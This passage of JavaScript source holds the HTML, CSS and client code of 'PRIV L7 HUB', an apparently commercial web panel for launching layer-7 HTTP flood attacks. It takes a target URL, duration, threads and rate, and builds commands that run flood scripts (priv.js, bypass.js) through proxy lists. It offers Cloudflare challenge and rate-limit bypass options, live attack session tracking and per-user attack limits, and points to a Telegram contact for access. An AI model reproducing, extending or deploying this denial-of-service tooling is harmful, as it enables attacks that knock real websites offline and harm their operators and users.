'<animate attributeName="r" from="4" to="34" dur="2.4s" begin="2.2s" repeatCount="indefinite"/>',
'<animate attributeName="opacity" values="0;0.9;0" dur="2.4s" begin="2.2s" repeatCount="indefinite"/>',
'</circle>',
'<circle cx="600" cy="130" r="0" fill="none" stroke="#e4e8ee" stroke-width="1.2" opacity="0">',
'<animate attributeName="r" from="4" to="34" dur="2s" begin="3.2s" repeatCount="indefinite"/>',
'<animate attributeName="opacity" values="0;0.9;0" dur="2s" begin="3.2s" repeatCount="indefinite"/>',
'</circle>',
'</svg>',

/* floating labels */
'<div class="map-meta"><span>ORIGIN NODES</span><span>·</span><span>TARGET</span></div>',
'</div>',

'<b class="loader-brand">PRIV&nbsp;L7&nbsp;HUB</b>',
'<div class="loader-status" id="loaderStatus">Establishing worldwide attack grid…</div>',
'<div class="packet-wave"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>',
'<div class="track"><i id="bar"></i></div>',
'<small id="pct">0%</small>',
'</div>',

'<div id="app" class="hide">',
'<header id="appHeader" class="hide"><button id="menu">&#9776;</button>',
'<div class="brand"><div><b>PRIV L7</b><small>HUB</small></div></div>',
'<button id="logout">&#8599;</button></header>',
'<aside id="drawer" class="hide">',
'<button data-page="hub">Hub</button>',
'<button data-page="settings">Settings</button>',
'<a href="https://t.me/privflood" target="_blank" rel="noopener">Contact &middot; t.me/privflood</a>',
'<small>PRIV L7 HUB</small></aside>',
'<main>',
'<section id="login" class="panel login">',
'<small class="eyebrow">SECURE ACCESS &middot; PRIV L7</small>',
'<h1>Welcome back.</h1>',
'<p>Sign in to manage approved scripts. Need access? Contact <a href="https://t.me/privflood" target="_blank" rel="noopener">t.me/privflood</a>.</p>',
'<form id="loginForm">',
'<label>Username<input name="username" autocomplete="username" required></label>',
'<label>Password<input name="password" type="password" autocomplete="current-password" required></label>',
'<button class="primary" id="loginBtn" type="submit"><span class="btn-label">Sign in</span><span class="btn-dots hide"><i></i><i></i><i></i></span><span class="btn-arrow">&#8594;</span></button>',
'<p id="loginErr" class="err"></p></form></section>',
'<section id="hub" class="hide">',
'<div class="intro"><small class="eyebrow">WORKSPACE / HUB</small>',
'<h1>Welcome to <span>Priv L7</span><br>Hub.</h1>',
'<p>A quiet, lightweight place to control your processes.</p></div>',
'<div class="stats">',
'<div class="stat"><small>ACTIVE SESSIONS</small><b id="capacity">0/3</b><span id="slots">3 slots available</span></div>',
'<div class="stat"><small>YOUR ROLE</small><b id="role">&mdash;</b><span id="limitsLine">Authenticated access</span></div>',
'</div>',
'<div class="panel"><small class="eyebrow">NEW PROCESS</small>',
'<h2>Launch configuration</h2>',
'<form id="launch" autocomplete="off">',
'<label>Method<select name="method" id="methodSelect" required></select>',
'<small id="methodsHint" style="display:block;margin-top:6px;"></small></label>',
'<div id="reqMethodWrap" class="hide">',
'<label>Request type<select name="reqmethod" id="reqMethodSelect">',
'<option value="GET" selected>GET</option>',
'<option value="POST">POST</option>',
'</select></label>',
'</div>',
'<label>Target URL <small>HTTPS &middot; any non-blacklisted hostname</small>',
'<div class="url"><span>https://</span><input name="target" id="targetInput" placeholder="target.com" required></div></label>',
'<div class="cols">',
'<label>Duration &middot; seconds<input name="duration" id="durationInput" type="number" value="60" min="1" required></label>',
'<label>Threads<input name="threads" id="threadsInput" type="number" value="8" min="1" required></label>',
'</div>',
'<label>Rate / Ratelimit<input name="rate" id="rateInput" type="number" value="90" min="1" required></label>',
'<div id="bypassFields" class="hide">',
'<label>Query<select name="query" id="querySelect">',
'<option value="0">0 &middot; none</option>',
'<option value="1" selected>1 &middot; ?__cf_chl_rt_tk=&hellip;</option>',
'<option value="2">2 &middot; /randompath</option>',
'<option value="3">3 &middot; ?q=rand&amp;rand</option>',
'</select></label>',
'<label>Delay &middot; ms<input name="delay" id="delayInput" type="number" value="0" min="0" max="50"></label>',
'<label>Options',
'<div style="display:flex;gap:20px;margin-top:10px;font-size:13px;color:#c8ced8;">',
'<label style="display:flex;align-items:center;gap:6px;margin:0;font-size:13px;"><input type="checkbox" name="limit" id="limitInput" style="width:auto;margin:0;"> --limit <small style="color:#8d96a5;font-size:10px;">(bypass rate limit)</small></label>',
'</div></label>',
'</div>',
'<div class="notice">Command preview:<br><code id="cmdPreview">node &lt;method&gt; &hellip;</code></div>',
'<button class="primary" id="startBtn" type="submit">Start process <span>&#8599;</span></button>',
'<p id="launchErr" class="err"></p></form></div>',
'<div class="headrow"><h2>Global Running Sessions</h2>',
'<button id="refresh" class="subtle" type="button">&#8635; Refresh</button></div>',
'<div id="sessions"></div></section>',
'<section id="settings" class="hide">',
'<div class="intro"><small class="eyebrow">PREFERENCES / SETTINGS</small>',
'<h1>Your account.</h1><p>Update your login credentials.</p></div>',
'<div class="panel"><h2>Account security</h2>',
'<form id="account">',
'<label>Current password<input type="password" name="currentPassword" required></label>',
'<label>New username<input name="newUsername" placeholder="Leave blank to keep current"></label>',
'<label>New password<input type="password" name="newPassword" minlength="3" placeholder="At least 3 characters"></label>',
'<button class="primary" type="submit">Save changes <span>&#8594;</span></button>',
'<p id="accountMsg"></p></form></div>',
'<div id="admin" class="panel hide">',
'<small class="eyebrow">ADMINISTRATOR</small>',
'<h2>Create user</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Set a limit to 0 for unlimited.</p>',
'<form id="createUser">',
'<label>Username<input name="username" required minlength="3" maxlength="32"></label>',
'<label>Temporary password<input name="password" type="password" required minlength="3" placeholder="At least 3 characters"></label>',
'<div class="cols">',
'<label>Max duration &middot; s<input type="number" name="maxDuration" value="0" min="0" placeholder="0 = unlimited"></label>',
'<label>Max threads<input type="number" name="maxThreads" value="0" min="0" placeholder="0 = unlimited"></label>',
'</div>',
'<div class="cols">',
'<label>Max rate<input type="number" name="maxRate" value="0" min="0" placeholder="0 = unlimited"></label>',
'<label>Max concurrent<input type="number" name="maxConcurrent" value="0" min="0" placeholder="0 = unlimited"></label>',
'</div>',
'<button class="primary" type="submit">Create account <span>+</span></button>',
'<p id="userMsg"></p></form><div id="users"></div></div>',
'<div id="adminBlacklist" class="panel hide">',
'<small class="eyebrow">ADMINISTRATOR</small>',
'<h2>Target blacklist</h2>',
'<p style="font-size:12px;color:var(--muted);margin-top:-8px;">Block users from targeting specific hosts. Use <code>example.com</code> or <code>*.example.com</code>.</p>',
'<form id="addBlacklist" autocomplete="off">',
'<label>Host pattern<input name="pattern" placeholder="example.com or *.example.com" required></label>',
'<button class="primary" type="submit">Add to blacklist <span>+</span></button>',
'<p id="blacklistMsg"></p></form>',
'<div id="blacklistList"></div></div>',
'</section></main>',
'<nav id="bottomNav" class="hide">',
'<button data-page="hub" class="active" type="button">&#8984;<small>Hub</small></button>',
'<button data-page="settings" type="button">&#9881;<small>Settings</small></button>',
'</nav>',
'<div id="toast" class="hide"></div>',
'</div>',
'<script src="/ui.js" defer></script>',
'</body></html>'
].join('\n');

const UI_CSS = [
':root{color-scheme:dark;--bg:#08090c;--panel:#10131a;--panel2:#0d1016;--line:#242a35;--text:#f1f3f7;--muted:#8d96a5;--accent:#e4e8ee}',
'*{box-sizing:border-box}',
'body{margin:0;background:radial-gradient(1200px 700px at 50% -20%,#141822 0%,#08090c 55%) no-repeat,var(--bg);color:var(--text);font:15px/1.5 system-ui,-apple-system,sans-serif;min-height:100vh}',
'button,input,select{font:inherit}button{cursor:pointer}.hide{display:none!important}',
'a{color:var(--accent)}',

/* ---------- LOADER (worldwide attack map) ---------- */
'.loader{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;background:radial-gradient(900px 600px at 50% 40%,#0d1119 0%,#040507 65%) no-repeat,#040507;transition:opacity .6s ease}',
'.loader.fade-out{opacity:0;pointer-events:none}',

'.map-scene{width:min(92vw,760px);position:relative;filter:drop-shadow(0 0 30px #1c2430)}',
'.map-svg{width:100%;height:auto;display:block}',
'.map-meta{display:flex;justify-content:center;gap:10px;margin-top:6px;color:#5f6b7e;font-size:10px;letter-spacing:.32em;text-transform:uppercase;font-weight:700}',

'.loader-brand{letter-spacing:.46em;font-size:14px;font-weight:800;color:#e4e8ee;text-indent:.46em;margin-top:2px}',
'.loader-status{font-size:11px;letter-spacing:.18em;color:#8d96a5;text-transform:uppercase}',

/* packet wave */
'.packet-wave{display:flex;align-items:flex-end;gap:3px;height:22px;margin-top:4px}',
'.packet-wave i{display:block;width:3px;height:6px;background:#3a4250;border-radius:1px;animation:pw 1.4s ease-in-out infinite}',
'.packet-wave i:nth-child(1){animation-delay:0s}',
'.packet-wave i:nth-child(2){animation-delay:.08s}',
'.packet-wave i:nth-child(3){animation-delay:.16s}',
'.packet-wave i:nth-child(4){animation-delay:.24s}',
'.packet-wave i:nth-child(5){animation-delay:.32s}',
'.packet-wave i:nth-child(6){animation-delay:.4s}',
'.packet-wave i:nth-child(7){animation-delay:.48s}',
'.packet-wave i:nth-child(8){animation-delay:.56s}',
'.packet-wave i:nth-child(9){animation-delay:.64s}',
'.packet-wave i:nth-child(10){animation-delay:.72s}',
'.packet-wave i:nth-child(11){animation-delay:.8s}',
'.packet-wave i:nth-child(12){animation-delay:.88s}',
'.packet-wave i:nth-child(13){animation-delay:.96s}',
'.packet-wave i:nth-child(14){animation-delay:1.04s}',
'.packet-wave i:nth-child(15){animation-delay:1.12s}',
'.packet-wave i:nth-child(16){animation-delay:1.2s}',
'@keyframes pw{0%,100%{height:6px;background:#3a4250}50%{height:20px;background:#e4e8ee}}',

'.track{width:240px;height:2px;background:#141821;border-radius:2px;overflow:hidden;position:relative;margin-top:2px}',
'.track i{display:block;width:0;height:100%;background:linear-gradient(90deg,#3a4250 0%,#e4e8ee 50%,#3a4250 100%);background-size:200% 100%;transition:width .1s linear;border-radius:2px;animation:shimmer 1.6s linear infinite}',
'@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}',
'.loader small{color:var(--muted);font-size:10px;letter-spacing:.28em;text-indent:.28em}',

/* ---------- APP ---------- */
'header{height:68px;display:flex;align-items:center;justify-content:space-between;padding:0 18px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#08090ced;z-index:3;backdrop-filter:blur(8px)}',
'header button{background:none;border:0;color:var(--text);font-size:21px}',
'.brand{display:flex;align-items:center;gap:10px;font-size:12px;letter-spacing:.18em}',
'.brand small{display:block;color:var(--muted);font-size:9px;letter-spacing:.3em}',
'main{width:min(100% - 30px,650px);margin:28px auto 100px}',
'.panel{background:var(--panel);border:1px solid var(--line);border-radius:17px;padding:21px;margin-bottom:16px}',
'.login{max-width:440px;margin:8vh auto}',
'.eyebrow{font-size:10px;letter-spacing:.22em;color:#9ba4b2;font-weight:800}',
'.intro{padding:10px 2px 22px}',
'.intro h1,.login h1{font-size:clamp(30px,7vw,42px);line-height:1.1;letter-spacing:-.05em;margin:12px 0}',
'.intro h1 span{color:#aeb8c7}.intro p,.login p{font-size:13px}',
'.login p a{color:var(--accent);text-decoration:none;border-bottom:1px solid #3a4250}',
'.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}',
'.stat{background:var(--panel2);border:1px solid var(--line);border-radius:13px;padding:14px}',
'.stat small,.stat span{display:block;color:var(--muted);font-size:10px}',
'.stat b{display:block;font-size:24px;margin:5px 0}',
'.panel h2,.headrow h2{font-size:18px;margin:6px 0 17px}',
'label{display:block;font-size:12px;color:#c8ced8;margin-bottom:15px}',
'label small{color:var(--muted);font-size:10px}',
'input,select{display:block;width:100%;margin-top:7px;border:1px solid #2b3240;background:#0a0d13;color:var(--text);padding:12px;border-radius:9px;min-width:0;outline:none}',
'input[type="checkbox"]{width:auto;display:inline-block;margin:0;padding:0}',
'input:focus,select:focus{border-color:#5f6b7e}select{cursor:pointer}',
'.url{display:flex;align-items:center;background:#0a0d13;border:1px solid #2b3240;border-radius:9px;padding:0 12px;margin-top:7px}',
'.url span{color:var(--muted);font-size:13px;white-space:nowrap}',
'.url input{border:0;background:transparent;margin:0;padding:12px 6px;border-radius:0}',
'.cols{display:grid;grid-template-columns:1fr 1fr;gap:12px}',
'.primary{width:100%;padding:14px;border:0;border-radius:11px;background:var(--accent);color:#08090c;font-weight:700;display:flex;align-items:center;justify-content:space-between;margin-top:5px;transition:background .2s}',
'.primary:hover{background:#cdd4df}.primary:disabled{opacity:.6;cursor:not-allowed}.primary span{font-size:18px}',

'.btn-dots{display:inline-flex;align-items:center;gap:4px;margin-left:auto}',
'.btn-dots i{width:6px;height:6px;border-radius:50%;background:#08090c;display:inline-block;animation:dot 1.2s infinite ease-in-out}',
'.btn-dots i:nth-child(1){animation-delay:0s}',
'.btn-dots i:nth-child(2){animation-delay:.15s}',
'.btn-dots i:nth-child(3){animation-delay:.3s}',
'@keyframes dot{0%,80%,100%{opacity:.25;transform:translateY(0)}40%{opacity:1;transform:translateY(-2px)}}',
'.btn-label{margin-right:auto}',

'.subtle{background:none;border:1px solid var(--line);color:var(--muted);padding:6px 12px;border-radius:8px;font-size:12px}',
'.subtle:hover{border-color:#4a5568;color:var(--text)}',
'.notice{background:#181e2a;border-left:3px solid #f0b34b;padding:10px 14px;border-radius:8px;font-size:11px;color:#d6dce6;margin:12px 0;word-break:break-all}',
'.notice code{background:#0a0d13;padding:4px 8px;border-radius:4px;font-size:10px;color:#a8b3c5;display:inline-block;margin-top:4px}',
'.err{color:#f87171;font-size:13px;min-height:20px;margin-top:8px}',
'.ok{color:#7ee0a1;font-size:13px;min-height:20px;margin-top:8px}',
'.headrow{display:flex;align-items:center;justify-content:space-between;margin:28px 0 14px}',
'.headrow h2{margin:0}',
'.session-item{background:var(--panel2);border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:10px}',
'.session-item .meta{font-size:12px;color:var(--muted);margin-top:4px}',
'.session-item .meta b{color:var(--text)}',
'.session-item .cmd{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;color:#a8b3c5;background:#0a0d13;padding:6px 10px;border-radius:6px;margin-top:8px;word-break:break-all}',
'.session-item .actions{margin-top:10px}',
'.session-item .actions button{background:#2a1e1e;border:1px solid #4a2e2e;color:#f87171;padding:6px 12px;border-radius:7px;font-size:11px}',
'.user-row{display:grid;grid-template-columns:1fr auto;gap:10px;align-items:center;padding:12px 0;border-bottom:1px solid var(--line)}',
'.user-row:last-child{border-bottom:0}',
'.user-row b{display:block;font-size:14px}',
'.user-row .meta{font-size:11px;color:var(--muted);margin-top:3px}',
'.user-row .row-actions{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end}',
'.user-row .row-actions button{background:#181e2a;border:1px solid var(--line);color:#c8ced8;padding:6px 10px;border-radius:7px;font-size:11px}',
'.user-row .row-actions button:hover{border-color:#4a5568;color:var(--text)}',
'.user-row .row-actions button.danger{background:#2a1e1e;border-color:#4a2e2e;color:#f87171}',
'.bl-item{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--line);font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}',
'.bl-item:last-child{border-bottom:0}',
'.bl-item button{background:#2a1e1e;border:1px solid #4a2e2e;color:#f87171;padding:5px 10px;border-radius:6px;font-size:11px}',
'.edit-limits{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px}',
'.edit-limits input{margin-top:0;padding:8px;font-size:12px}',
'aside#drawer{position:fixed;top:68px;left:0;bottom:0;width:230px;background:#0b0e14;border-right:1px solid var(--line);padding:18px;z-index:4;display:flex;flex-direction:column;gap:6px}',
'aside#drawer button,aside#drawer a{background:none;border:0;color:var(--text);text-align:left;padding:10px 12px;border-radius:8px;font-size:14px;text-decoration:none}',
'aside#drawer button:hover,aside#drawer a:hover{background:#1a1f2a}',
'aside#drawer small{margin-top:auto;color:var(--muted);font-size:10px;padding:12px;letter-spacing:.2em}',
'nav#bottomNav{position:fixed;bottom:0;left:0;right:0;background:#08090cf2;border-top:1px solid var(--line);display:flex;justify-content:center;gap:40px;padding:10px 0 calc(10px + env(safe-area-inset-bottom));backdrop-filter:blur(8px);z-index:3}',
'nav#bottomNav button{background:none;border:0;color:var(--muted);display:flex;flex-direction:column;align-items:center;gap:3px;font-size:20px;transition:color .2s}',
'nav#bottomNav button small{font-size:10px}nav#bottomNav button.active{color:var(--accent)}',
'#toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:var(--accent);color:#08090c;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:600;z-index:10;box-shadow:0 8px 24px #00000066}',
'@media (min-width:700px){aside#drawer{display:none!important}#menu{display:none}}',
'@media (max-width:560px){.map-scene{width:100%}.loader-brand{letter-spacing:.3em;font-size:12px}}'
].join('\n');

const UI_JS = [
'(function(){',
'"use strict";',
'try{if(window.Telegram&&window.Telegram.WebApp){window.Telegram.WebApp.ready();window.Telegram.WebApp.expand();}}catch(e){}',
'var $=function(s){return document.querySelector(s);};',
'var $$=function(s){return document.querySelectorAll(s);};',
'var loader=$("#loader"),bar=$("#bar"),pct=$("#pct"),app=$("#app"),loaderStatus=$("#loaderStatus");',
'var currentUser=null,sessionPoll=null,methodsList=[];',
'var loginSection=$("#login"),hubSection=$("#hub"),settingsSection=$("#settings");',
'var adminPanel=$("#admin"),adminBlacklist=$("#adminBlacklist"),drawer=$("#drawer"),appHeader=$("#appHeader"),bottomNav=$("#bottomNav");',
'function showToast(msg){',
'var t=$("#toast");if(!t)return;',
't.textContent=msg;t.classList.remove("hide");',
'clearTimeout(t._timer);t._timer=setTimeout(function(){t.classList.add("hide");},2800);',
'}',
'function escapeHtml(s){return String(s==null?"":s).replace(/[&<>"\\\']/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;","\\"":"&quot;","\\\'":"&#39;"}[c];});}',
'function limitLabel(v){return (v===0||v===undefined||v===null)?"unlimited":String(v);}',

/* ---- Loader: fixed 5s ---- */
'function bootLoader(){',
'var DURATION=5000;',
'var start=Date.now();',
'var phases=[',
'{at:0,t:"Establishing worldwide attack grid…"},',
'{at:1000,t:"Mapping origin nodes…"},',
'{at:2000,t:"Routing packets through proxies…"},',
'{at:3200,t:"Locking onto target…"},',
'{at:4200,t:"Engaging L7 engine…"},',
'{at:4800,t:"Ready."}',
'];',
'var phaseIdx=0;',
'var iv=setInterval(function(){',
'var elapsed=Date.now()-start;',
'var v=Math.min(100,(elapsed/DURATION)*100);',
'bar.style.width=v+"%";',
'pct.textContent=Math.round(v)+"%";',
'while(phaseIdx<phases.length-1&&elapsed>=phases[phaseIdx+1].at){phaseIdx++;}',
'if(loaderStatus)loaderStatus.textContent=phases[phaseIdx].t;',
'if(v>=100){',
'clearInterval(iv);',
'setTimeout(function(){',
'loader.classList.add("fade-out");',
'app.classList.remove("hide");',
'setTimeout(function(){loader.style.display="none";},650);',
'bootApp();',
'},300);',
'}',
'},60);',
'}',
'bootLoader();',

'async function api(path,opts){',
'opts=opts||{};',
'var res=await fetch(path,Object.assign({',
'headers:{"Content-Type":"application/json"},',
'credentials:"same-origin"',
'},opts));',
'var data={};',
'try{data=await res.json();}catch(e){}',
'if(!res.ok)throw new Error(data.error||("HTTP "+res.status));',
'return data;',
'}',
'function setPage(page){',
'loginSection.classList.add("hide");',
'hubSection.classList.add("hide");',
'settingsSection.classList.add("hide");',
'if(page==="hub")hubSection.classList.remove("hide");',
'else if(page==="settings")settingsSection.classList.remove("hide");',
'else if(page==="login")loginSection.classList.remove("hide");',
'$$("#bottomNav button").forEach(function(b){b.classList.toggle("active",b.dataset.page===page);});',
'drawer.classList.add("hide");',
'var isAdmin=currentUser&&currentUser.role==="admin";',
'if(page==="settings"&&isAdmin){',
'adminPanel.classList.remove("hide");adminBlacklist.classList.remove("hide");',
'loadUsers();loadBlacklist();',
'}else{',
'adminPanel.classList.add("hide");adminBlacklist.classList.add("hide");',
'}',
'}',
'function showLogin(){',
'currentUser=null;',
'appHeader.classList.add("hide");',
'bottomNav.classList.add("hide");',
'setPage("login");',
'if(sessionPoll){clearInterval(sessionPoll);sessionPoll=null;}',
'}',
'function showApp(){',
'appHeader.classList.remove("hide");',
'bottomNav.classList.remove("hide");',
'setPage("hub");',
'loadMethods();',
'loadSessions();',
'if(sessionPoll)clearInterval(sessionPoll);',
'sessionPoll=setInterval(loadSessions,5000);',
'}',
'function updateRoleDisplay(){',
'if(!currentUser)return;',
'var r=$("#role");if(r)r.textContent=currentUser.role==="admin"?"Admin":"User";',
'var lim=$("#limitsLine");',
'if(lim&&currentUser.limits){',
'var L=currentUser.limits;',
'lim.textContent="dur:"+limitLabel(L.maxDuration)+" \\u00b7 th:"+limitLabel(L.maxThreads)+" \\u00b7 rate:"+limitLabel(L.maxRate)+" \\u00b7 conc:"+limitLabel(L.maxConcurrent);',
'}',
'}',
'function applyUserLimits(){',
'if(!currentUser||!currentUser.limits)return;',
'var L=currentUser.limits;',
'var d=$("#durationInput"),th=$("#threadsInput"),r=$("#rateInput");',
'function apply(el,v){',
'if(!el)return;',
'if(v>0){el.max=v;if(Number(el.value)>v)el.value=v;}',
'else{el.removeAttribute("max");}',
'}',
'apply(d,L.maxDuration);',
'apply(th,L.maxThreads);',
'apply(r,L.maxRate);',
'}',
'async function loadMethods(){',
'var sel=$("#methodSelect");',
'var hint=$("#methodsHint");',
'if(!sel)return;',
'try{',
'var data=await api("/api/methods");',
'methodsList=data.methods||[];',
'sel.innerHTML="";',
'if(!methodsList.length){',
'var opt=document.createElement("option");',
'opt.value="";opt.textContent="No methods found";',
'sel.appendChild(opt);',
'if(hint)hint.textContent="Place priv.js / bypass.js next to hub.js in: "+data.dir;',
'return;',
'}',
'methodsList.forEach(function(m){',
'var opt=document.createElement("option");',
'opt.value=m.id;opt.textContent=m.name;',
'sel.appendChild(opt);',
'});',
'sel.value=methodsList[0].id;',
'var proxyNote=data.proxyExists?"":" (WARNING: "+data.proxy+" missing!)";',
'if(hint)hint.textContent=methodsList.length+" method"+(methodsList.length===1?"":"s")+" | "+data.proxy+proxyNote;',
'updateMethodFields();',
'updateCmdPreview();',
'}catch(e){',
'sel.innerHTML=\'<option value="">Failed to load</option>\';',
'if(hint)hint.textContent="Error: "+e.message;',
'}',
'}',
'function updateMethodFields(){',
'var sel=$("#methodSelect");',
'if(!sel)return;',
'var m=sel.value;',
'var methodInfo=methodsList.find(function(x){return x.id===m;});',
'var reqWrap=$("#reqMethodWrap");',
'var bypassFields=$("#bypassFields");',
'var wantsReqMethod=methodInfo&&methodInfo.fields&&methodInfo.fields.indexOf("reqmethod")!==-1;',
'var wantsBypassExtras=methodInfo&&methodInfo.fields&&methodInfo.fields.indexOf("query")!==-1;',
'if(reqWrap){',
'if(wantsReqMethod)reqWrap.classList.remove("hide");',
'else reqWrap.classList.add("hide");',
'}',
'if(bypassFields){',
'if(wantsBypassExtras)bypassFields.classList.remove("hide");',
'else bypassFields.classList.add("hide");',
'}',
'}',
'async function loadSessions(){',
'try{',
'var data=await api("/api/sessions");',
'var list=data.sessions||[];',
'var cap=$("#capacity"),slots=$("#slots");',
'if(cap)cap.textContent=list.length+"/"+data.capacity;',
'if(slots)slots.textContent=data.available+" slot"+(data.available===1?"":"s")+" available";',
'var container=$("#sessions");',
'if(!container)return;',
'if(!list.length){',
'container.innerHTML=\'<p style="color:var(--muted);font-size:13px;padding:12px 0;">No running sessions globally.</p>\';',
'return;',
'}',
'container.innerHTML=list.map(function(s){',
'return \'<div class="session-item" data-id="\'+s.id+\'">\'+',
'\'<div><b>\'+escapeHtml(s.method)+\'</b> &rarr; \'+escapeHtml(s.target)+\'</div>\'+',
'\'<div class="meta">\'+escapeHtml(s.status)+\' &middot; \'+s.elapsedSeconds+\'s / \'+s.duration+\'s &middot; owner: <b>\'+escapeHtml(s.owner)+\'</b></div>\'+',
'\'<div class="cmd">$ \'+escapeHtml(s.command)+\'</div>\'+',
'\'<div class="actions"><button class="stop-btn" data-id="\'+s.id+\'" type="button">Terminate</button></div>\'+',
'\'</div>\';',
'}).join("");',
'container.querySelectorAll(".stop-btn").forEach(function(btn){',
'btn.addEventListener("click",async function(e){',
'e.stopPropagation();',
'try{',
'await api("/api/sessions/"+btn.dataset.id,{method:"DELETE"});',
'showToast("Termination requested");',
'loadSessions();',
'}catch(err){showToast(err.message);}',
'});',
'});',
'}catch(e){}',
'}',
'async function loadUsers(){',
'try{',
'var data=await api("/api/users");',
'var container=$("#users");',
'if(!container)return;',
'container.innerHTML=data.users.map(function(u){',
'var lim=u.limits||{};',
'return \'<div class="user-row" data-username="\'+escapeHtml(u.username)+\'">\'+',
'\'<div><b>\'+escapeHtml(u.username)+\'</b>\'+',
'\'<div class="meta">\'+escapeHtml(u.role)+\' &middot; dur:\'+limitLabel(lim.maxDuration)+\' &middot; th:\'+limitLabel(lim.maxThreads)+\' &middot; rate:\'+limitLabel(lim.maxRate)+\' &middot; conc:\'+limitLabel(lim.maxConcurrent)+\'</div>\'+',
'\'<div class="edit-limits hide">\'+',
'\'<input type="number" data-k="maxDuration" min="0" value="\'+lim.maxDuration+\'" title="max duration (0=unlimited)">\'+',
'\'<input type="number" data-k="maxThreads" min="0" value="\'+lim.maxThreads+\'" title="max threads (0=unlimited)">\'+',
'\'<input type="number" data-k="maxRate" min="0" value="\'+lim.maxRate+\'" title="max rate (0=unlimited)">\'+',
'\'<input type="number" data-k="maxConcurrent" min="0" value="\'+lim.maxConcurrent+\'" title="max concurrent (0=unlimited)">\'+',
'\'</div></div>\'+',
'\'<div class="row-actions">\'+',
'\'<button class="edit-btn" type="button">Edit</button>\'+',
'\'<button class="save-btn hide" type="button">Save</button>\'+',
'\'<button class="danger del-btn" type="button">Delete</button>\'+',
'\'</div></div>\';',
'}).join("");',
'container.querySelectorAll(".user-row").forEach(function(row){',
'var username=row.dataset.username;',
'var editBtn=row.querySelector(".edit-btn");',
'var saveBtn=row.querySelector(".save-btn");',
'var delBtn=row.querySelector(".del-btn");',
'var editBox=row.querySelector(".edit-limits");',
'if(editBtn)editBtn.addEventListener("click",function(){',
'editBox.classList.toggle("hide");',
'saveBtn.classList.toggle("hide",editBox.classList.contains("hide"));',
'});',
'if(saveBtn)saveBtn.addEventListener("click",async function(){',
'var payload={};',
'editBox.querySelectorAll("input").forEach(function(inp){payload[inp.dataset.k]=Number(inp.value);});',
'try{',
'await api("/api/users/"+encodeURIComponent(username),{method:"PUT",body:JSON.stringify(payload)});',
'showToast("User updated");loadUsers();',
'}catch(err){showToast(err.message);}',
'});',
'if(delBtn)delBtn.addEventListener("click",async function(){',
'if(!confirm("Delete user "+username+"?"))return;',
'try{',
'await api("/api/users/"+encodeURIComponent(username),{method:"DELETE"});',
'showToast("User deleted");loadUsers();',
'}catch(err){showToast(err.message);}',
'});',
'});',
'}catch(e){}',
'}',
'async function loadBlacklist(){',
'try{',
'var data=await api("/api/blacklist");',
'var container=$("#blacklistList");',
'if(!container)return;',
'var list=data.blacklist||[];',
'if(!list.length){container.innerHTML=\'<p style="color:var(--muted);font-size:13px;padding:8px 0;">No blacklisted hosts.</p>\';return;}',
'container.innerHTML=list.map(function(p){',
'return \'<div class="bl-item"><span>\'+escapeHtml(p)+\'</span><button data-pattern="\'+escapeHtml(p)+\'" type="button">Remove</button></div>\';',
'}).join("");',
'container.querySelectorAll("button").forEach(function(btn){',
'btn.addEventListener("click",async function(){',
'try{',
'await api("/api/blacklist/"+encodeURIComponent(btn.dataset.pattern),{method:"DELETE"});',
'showToast("Removed");loadBlacklist();',
'}catch(err){showToast(err.message);}',
'});',
'});',
'}catch(e){}',
'}',
'async function checkAuth(){',
'try{',
'var data=await api("/api/me");',
'currentUser=data.user;',
'updateRoleDisplay();',
'showApp();',
'applyUserLimits();',
'}catch(e){',
'showLogin();',
'}',
'}',
'function updateCmdPreview(){',
'var el=$("#cmdPreview");if(!el)return;',
'var sel=$("#methodSelect");',
'var targetEl=$("#targetInput");',
'var dEl=$("#durationInput");',
'var thEl=$("#threadsInput");',
'var rEl=$("#rateInput");',
'var methodId=(sel&&sel.value)||"priv";',
'var t=(targetEl&&targetEl.value.trim())||"<target>";',
'if(t!=="<target>"&&!/^https?:\\/\\//i.test(t))t="https://"+t;',
'var d=(dEl&&dEl.value)||"<duration>";',
'var th=(thEl&&thEl.value)||"<threads>";',
'var r=(rEl&&rEl.value)||"<rate>";',
'if(methodId==="bypass"){',
'var rm=($("#reqMethodSelect")&&$("#reqMethodSelect").value)||"GET";',
'var q=($("#querySelect")&&$("#querySelect").value)||"0";',
'var dl=($("#delayInput")&&$("#delayInput").value)||"0";',
'var lim=($("#limitInput")&&$("#limitInput").checked);',
'var parts=["node bypass.js",rm,t,d,th,r,"proxy.txt"];',
'if(q!=="0")parts.push("--query",q);',
'if(lim)parts.push("--limit","true");',
'if(dl&&Number(dl)>0)parts.push("--delay",dl);',
'el.textContent=parts.join(" ");',
'}else{',
'el.textContent="node priv.js "+t+" "+d+" proxy.txt "+th+" "+r+" -c -h";',
'}',
'}',
'async function startProcess(e){',
'e.preventDefault();',
'var err=$("#launchErr");if(err)err.textContent="";',
'var sel=$("#methodSelect");',
'var targetEl=$("#targetInput");',
'var dEl=$("#durationInput");',
'var thEl=$("#threadsInput");',
'var rEl=$("#rateInput");',
'var btn=$("#startBtn");',
'if(!sel||!sel.value){if(err)err.textContent="No method selected.";return;}',
'var target=String(targetEl.value||"").trim();',
'if(!target){if(err)err.textContent="Enter a target URL.";return;}',
'if(!/^https?:\\/\\//i.test(target))target="https://"+target;',
'var payload={',
'method:sel.value,',
'target:target,',
'duration:Number(dEl.value),',
'threads:Number(thEl.value),',
'rate:Number(rEl.value)',
'};',
'if(sel.value==="bypass"){',
'payload.reqmethod=($("#reqMethodSelect")&&$("#reqMethodSelect").value)||"GET";',
